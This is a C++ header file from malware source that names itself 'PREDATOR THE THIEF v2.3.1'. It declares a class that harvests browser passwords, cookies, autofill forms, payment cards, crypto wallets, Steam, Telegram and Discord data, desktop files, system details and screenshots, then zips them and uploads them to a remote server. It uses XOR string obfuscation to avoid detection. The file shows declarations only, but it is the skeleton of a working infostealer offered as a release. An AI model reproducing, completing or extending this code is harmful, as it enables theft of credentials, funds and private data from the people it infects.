#pragma once
#include <string>
#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "wininet.lib")

#include "file.h"
#include "xor.h"
#include "sqlite3.h"
#include "zip.h"
#include "DynImport.h"

#define XOR(x) XorStr(x)

using std::string;

#define VERSION XOR("PREDATOR THE THIEF | v2.3.1 RELEASE")

class Stealing
{
	string DecryptStr(BYTE* block);
	file File;
	void CopyByMask(const string& path, const string& mask, const string& output, bool make_normal = false, bool second_lvl = false);
	void WriteAllText(const string& file, const string& text, const string& mode = "a");
	
	bool urlWriteFile(const string& server, const string& path, DWORD port, const string& file_path, const string& file_name);
	LONG GetStringRegKeyA(HKEY hkey, const string& strValueName, string& output, const string& def_value);

	PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp);
	void CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC);

	void __cpuid(int CPUInfo[4], int InfoType);
	void GetCpu(string& output);

	string passPath, cookiePath, formPath, cardPath;
public:
	unsigned int passwords = 0, cookies = 0, cards = 0, forms = 0;
	bool bSteam = false, bWallets = false, bTeleg = false;

	const string define_browser(const string& path);

	Stealing(const string& pass, const string& cookie, const string& formPath, const string& card)
	{
		passPath = pass;
		cookiePath = cookie;
		this->formPath = formPath;
		cardPath = card;
	}

	const string new_path = string(getenv(XOR("temp"))) + (string)XOR("\\{a8aw6353}.txt");

	void GetPasswords(const string& path);
	void GetCookies(const string& path);
	void GetForms(const string& path);
	void GetCards(const string& path);

	void GetFormsGecko(const string& path);

	void GetWalletsReg(const string& output_dir);
	void GetWalletsPath(const string& output_dir);

	void GetDesktopFiles(const string& output_dir);
	void GetSteam(const string& output_dir);
	void GetTelegram(const string& output_dir);
	void GetDiscord(const string& output_dir);
	void GetInformation(const string& output_path);
	void GetScreenShot(const string& output_path);

	void ZipFolder(const string& path, const string& output_path);
	void Release(const string& first, const string& url, const string& zip_path, const string& output_fileName);
};

